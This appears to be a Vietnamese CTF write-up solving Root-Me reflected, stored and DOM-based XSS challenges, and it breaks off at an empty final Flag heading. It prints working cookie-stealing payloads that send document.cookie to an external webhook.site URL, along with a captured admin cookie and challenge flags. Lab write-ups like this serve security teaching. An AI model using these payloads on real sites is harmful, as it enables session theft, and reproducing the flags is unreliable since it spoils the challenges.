# XSS - Reflected
alert(’xtra stupid security’)

**Statement**

Find a way to steal the administrator’s cookie.

Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.
## Cách làm
Truy cập vào link http://challenge01.root-me.org/web-client/ch26/ ta sẽ thấy giao diện:

![image](https://github.com/aQ05/Write-up/assets/121664384/b0830567-58d6-46ea-b51a-c2c6b969bfd3)

Click vào từng mục, ta dễ dàng thấy ở mỗi mục có một thuộc tính `p` được gắn giá trị tương ứng từng mục:
![Screenshot 2023-11-11 145248](https://github.com/aQ05/Write-up/assets/121664384/a1ec5dec-0d3d-4d87-a7d3-c7dc92fd8c62)

Thử gán thuộc tính `p` đó cho câu lệnh `<script>alert(1)</script>` để kiểm tra xem nó có dính lỗi XSS hay không

![image](https://github.com/aQ05/Write-up/assets/121664384/8ed0492d-991e-4661-8f7e-d4e00a4c42e0)

Khi request đến `?p=<script>alert(1)</script>`, website hiển thị trang web lỗi và có một hyperlink thẻ <a> hiển thị nội dung ‘<script>alert(1)</script>’. Có thể thấy web đã dính lỗi XSS:

![image](https://github.com/aQ05/Write-up/assets/121664384/a7829112-fe4b-448b-883c-a15d6248a8ab)

Thử nhập `?p=ayuq' onmousemove='alert(1)`, page sẽ báo lỗi và hiển thị nội dung trong thẻ <a>.  (`onmousemove` khi trỏ chuột vào thì nó sẽ chạy đoạn js bên trong).

![image](https://github.com/aQ05/Write-up/assets/121664384/a756767e-6e32-4113-975d-a5b1aad6bb02)

Khi đó, ta thực hiện gửi cookie của admin vào host của mình.

Payload: `ayuq' onmousemove='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)`

![image](https://github.com/aQ05/Write-up/assets/121664384/c6f69bd0-f38a-4781-9e82-610e23e907c2)

Thực hiện request với payload. Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước Report đến admin đển POST request:

![image](https://github.com/aQ05/Write-up/assets/121664384/102832e4-d086-4119-a80b-e2f3e269d2f9)

![Screenshot 2023-11-11 160952](https://github.com/aQ05/Write-up/assets/121664384/a6a8c118-390f-4652-82db-1a58d76dc8e5)

## Flag
`r3fL3ct3D_XsS_fTw`
# XSS - Stored 1
So easy to sploit

**Statement:** Steal the administrator session cookie and use it to validate this chall.
## Cách làm
Truy cập vào link http://challenge01.root-me.org/web-client/ch18/

![image](https://github.com/aQ05/Write-up/assets/121664384/d4fb4482-d55a-4807-bb40-1083cacdb7e3)

Trước hết ta kiểm tra xem nó bị XSS ở đâu bằng cách nhập `<script>alert(1)</script>` vào từng trường và thấy dữ liệu được lưu lại khi nhập vào ô `message`.

![image](https://github.com/aQ05/Write-up/assets/121664384/6ca93f7e-d63f-4c67-81eb-ac44c5744587)

 Dính lỗi Stored XSS tại ô `message`.

![image](https://github.com/aQ05/Write-up/assets/121664384/9e9bb840-c70d-478f-9429-c705037b2f02)

Payload một đoạn script dẫn đến host của mình kèm theo admin, ở đây chúng ta sử dụng thẻ `img` với thuộc tính `onerror` (nếu đường link dẫn đến ảnh bị lỗi thì nó sẽ tự động thực thi đoạn script bên trong mà không cần thao tác của người dùng).

Payload: `<img src=a onerror='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?"+document.cookie'/>`

![image](https://github.com/aQ05/Write-up/assets/121664384/9524d672-fba8-4de7-a5e6-99cc94b3fe33)

Khi gửi ta sẽ thấy một cái ảnh bị lỗi và tự thực thi câu lệnh

![image](https://github.com/aQ05/Write-up/assets/121664384/45edbd9b-7a5e-4681-9ed1-cfe99b64e3d0)

![Screenshot 2023-11-11 214521](https://github.com/aQ05/Write-up/assets/121664384/80211e65-d540-4dbe-a361-5b9926b0b0f0)
## Flag
`NkI9qe4cdLIO2P7MIsWS8ofD6`

# XSS - Stored 2
Author

**Statement:**
Steal the administrator session’s cookie and go in the admin section.
## Cách làm
Truy cập link http://challenge01.root-me.org/web-client/ch19/

![image](https://github.com/aQ05/Write-up/assets/121664384/a0fd7f02-239e-4e30-be8d-e9b1b9834dca)

Giao diện ở đây tương tự như bài Stored 1, cũng là gửi message mà lưu lại chờ admin đọc. Trước hết ta kiểm tra xem nó bị XSS ở đâu bằng cách nhập `<script>alert(1)</script>` vào từng trường và thấy dữ liệu được lưu lại khi nhập vào ô `message`.

![image](https://github.com/aQ05/Write-up/assets/121664384/32391831-5ed1-4d3a-b5c8-a06aa0d551ed)

Kiểm tra thử thì thấy có điều đặc biệt ở đây là **Status: invite** ở mỗi post. Xem source thì thấy status được đặt trong thẻ `i`.

![image](https://github.com/aQ05/Write-up/assets/121664384/5f502bde-8b49-4244-85f5-3c4e0cbc4cab)

Và nó được xử lý dựa trên cookie này:

![image](https://github.com/aQ05/Write-up/assets/121664384/f0ce66a9-f1b0-47bc-93fd-d77073f55495)

Thử dùng Burp Suite xem có thể thay đổi được status không thì thấy status được gửi qua phần cookie và có thể tùy ý thay đổi:

![image](https://github.com/aQ05/Write-up/assets/121664384/20a3572d-e879-4c32-b592-edccee2bdea8)

 Thử payload XSS vào: `"><script>alert(1)</script><p class="`
 
![image](https://github.com/aQ05/Write-up/assets/121664384/64346860-330d-48b8-84fc-19db43675249)


Từ đó, ta đã có chỗ để tiêm XSS vào rồi. 

![image](https://github.com/aQ05/Write-up/assets/121664384/b27093ad-0b2b-43e9-9cb4-8a50d054ad22)

Tương tự các bài stored, dùng payload gửi cookie vào host của mình.

Payload:`"><img src=1 onerror='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?cmd="+document.cookie'/><p class="`

![Screenshot 2023-11-11 225413](https://github.com/aQ05/Write-up/assets/121664384/1e07790b-2e14-4401-9481-6857fc87974c)

Ta thu được admin cookie: `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`. Có ADMIN_COOKIE, ta thay đổi vào cookie và `GET` pass:

`cookie: status=ayuQ; ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`

![Screenshot 2023-11-12 003334](https://github.com/aQ05/Write-up/assets/121664384/9de048c4-c89e-4418-b8a3-49a05c220968)

## Flag
`E5HKEGyCXQVsYaehaqeJs0AfV`

# XSS DOM Based - Introduction
An introduction to DOM Based Cross Site Scripting attacks

**Statement**: Steal the admin’s session cookie.
## Cách làm
Truy cập link http://challenge01.root-me.org/web-client/ch32/

![image](https://github.com/aQ05/Write-up/assets/121664384/06f56fa5-8908-4e6c-964e-7f5f76eb36eb)

![image](https://github.com/aQ05/Write-up/assets/121664384/7a29797c-4c8a-4659-af98-a86172919029)

Thử kiểm tra XSS ở ô này bằng payload `';alert(1)//` thì thấy thành công:

![image](https://github.com/aQ05/Write-up/assets/121664384/59eb4aa4-52e2-46c2-afb2-2d29e91bb1ea)

## Flag
